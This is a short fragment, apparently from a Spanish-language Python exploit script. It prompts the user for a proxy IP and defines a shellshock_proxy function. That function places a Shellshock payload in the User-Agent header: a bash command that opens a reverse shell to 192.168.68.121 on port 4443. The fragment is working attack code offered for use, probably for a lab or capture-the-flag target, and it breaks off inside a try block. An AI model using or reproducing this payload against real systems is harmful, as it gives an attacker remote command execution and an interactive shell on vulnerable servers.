...
if use_proxy_option == '1':
    ...
    while True:
        proxy_ip = input("\n" + blueColour + "Ingresa la dirección IP del proxy: " + endColour).strip()
...
def shellshock_proxy():
    headers = { 'User-Agent' : "() { :;}; echo; echo; echo; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.68.121/4443 0>&1'"}
    try:
        if proxy:
